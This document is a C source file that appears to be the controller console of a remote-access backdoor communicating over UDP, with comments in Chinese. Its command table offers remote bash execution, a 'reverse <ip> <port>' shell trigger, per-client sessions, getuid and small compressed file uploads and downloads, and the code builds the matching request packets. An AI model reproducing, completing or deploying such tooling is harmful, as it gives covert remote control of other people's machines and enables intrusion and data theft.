#include <stdio.h>
#include <stdlib.h>
#include "../include/util.h"
#include <unistd.h>
#include "app.h"
#include "../include/udp.h"
#include "../include/cmd.h"
#include <string.h>
#include <pthread.h>
#include <ctype.h>
#include "session.h"
#include "zlib.h"
#include <arpa/inet.h>


static struct
{
    const char * cmd;
    const char * argv[5];
}g_cmdUsageTable[] = {
    {"session", {"<list|clientid|timeout>", 0, 0, 0, 0}},
    {"getuid", {0, 0, 0, 0, 0}},
    {"upload", {"<local>", "<remote>", 0, 0, 0}},
    {"download", {"<remote>", "<local>", 0, 0, 0}},
    {"bash", {"<shell cmd>", 0, 0, 0, 0}},
    {"move", {"<src>", "<dst>", 0, 0, 0}},
    {"mkdir", {"<dir>", 0, 0, 0, 0}},
    {"rmdir", {"<dir>", 0, 0, 0, 0}},
    {"rename", {"<old>", "<new>", 0, 0, 0}},
    {"list", {0, 0, 0, 0, 0}},
    {"rm", {"<file>", 0, 0, 0, 0}},
    {"cd", {"<dir>", 0, 0, 0, 0}},
    {"pwd", {0, 0, 0, 0, 0}},
    {"hostip", {0, 0, 0, 0, 0}},
    {"reverse", {"<ip>", "<port>", 0, 0, 0}},
    {"safeexit", {0, 0, 0, 0, 0}},
};

//-1 没有命令
int findCmd(const char * cmd, int * argc)
{
    for (int i = 0; i < sizeof(g_cmdUsageTable)/sizeof(g_cmdUsageTable[0]); i++)
    {
        if (strcmp(g_cmdUsageTable[i].cmd, cmd) == 0)
        {
            int count = 0;
            for (int j = 0; j < sizeof(g_cmdUsageTable[i].argv)/sizeof(char *) && g_cmdUsageTable[i].argv[j]; j++)
            {
                ++ count;
            }
            *argc = count;
            return i;
        }
    }
    return -1;
}

void usage()
{
    for (int i = 0; i < sizeof(g_cmdUsageTable)/sizeof(g_cmdUsageTable[0]); i++)
    {
        printf("%s", g_cmdUsageTable[i].cmd);
        for (int j = 0; j < sizeof(g_cmdUsageTable[i].argv)/sizeof(char *) && g_cmdUsageTable[i].argv[j]; j++)
        {
            printf(" %s", g_cmdUsageTable[i].argv[j]);
        }
        printf("\n");
    }
}

void help(int code)
{
    printf("Usage: %s", g_cmdUsageTable[code].cmd);
    for (int j = 0; j < sizeof(g_cmdUsageTable[code].argv)/sizeof(char *) && g_cmdUsageTable[code].argv[j]; j++)
    {
        printf(" %s", g_cmdUsageTable[code].argv[j]);
    }
    printf("\n");
}

int parseCmdLine(char * cmdline, const char *argv[])
{
    int argc = 0;
    int findWord = 0;
    for (int i = 0; cmdline[i] != 0; i++)
    {
        if (cmdline[i] != ' ' && cmdline[i] != '\n')
        {
        	if(findWord == 0)
        	{
        		argv[argc++] = &cmdline[i];
			}
            findWord = 1;
        }
        else
        {
            cmdline[i] = 0;
            findWord = 0;
        }
    }
    return argc;
}

int buildCmdReq(unsigned char code, const char *argv[], int argc, char * out, int maxSize)
{
    struct CmdReq * cmd = (struct CmdReq *)out;
    cmd->code = code;
    getRand(&cmd->sid, 2);
    char * p = cmd->data;
    int offset = 0;
    if (code == SERVER_CMD_SHELL)
    {
        //将所有参数组合成一个参数
        for (int i = 1; i < argc; i++)
        {
            for (int j = 0; argv[i][j]; j++)
            {
                p[offset++] = argv[i][j];
            }
            p[offset++] = ' ';
        }
        p[offset-1] = 0;
    }
    else if (code == SERVER_CMD_UPLOAD)
    {
        //因为输入参数与输出实际是同一个缓冲,因此要将名字先复制出来
        char localFile[255], remoteFile[255];
        strcpy_s(localFile, sizeof(localFile), argv[1]);
        int fileNameLen = strcpy_s(remoteFile, sizeof(remoteFile), argv[2]);

        memcpy_s(p, maxSize - sizeof(*cmd), remoteFile, fileNameLen);
        offset += fileNameLen;

        unsigned long plainLen = 65536;
        char * plainData = (char *)malloc(plainLen);
        int fileSize = readFile(localFile, plainData, plainLen);
        if (fileSize < 0)
        {
            perror("Local error");
            free(plainData);
            return -1;
        }
        else if(fileSize == 0)
        {
            printf("Local error: file size exceed 64K\n");
            free(plainData);
            return -1;
        }

        unsigned long compressedLen = maxSize - sizeof(*cmd) - offset;
        int ret = compress2((Bytef *)(p + offset), &compressedLen, (const Bytef *)plainData, fileSize, 9);
        if (ret != Z_OK)
        {
            printf("compress2 %d\n", ret);
            free(plainData);
            return -1;
        }

        if (compressedLen > 430)//最大字节数
        {
            printf("Local error: file size(%lu) after compress exceed 430\n", compressedLen);
            free(plainData);
            return -1;
        }
                
        free(plainData);
        offset += compressedLen;
    }
    else
    {
        for (int i = 1; i < argc; i++)
        {
            int len = strlen(argv[i]) + 1;
            memcpy_s(p + offset, maxSize - offset - sizeof(*cmd), argv[i], len);
            offset += len;
        }
    }
    
    cmd->datalen = htons(offset);
    return offset + sizeof(*cmd);
}

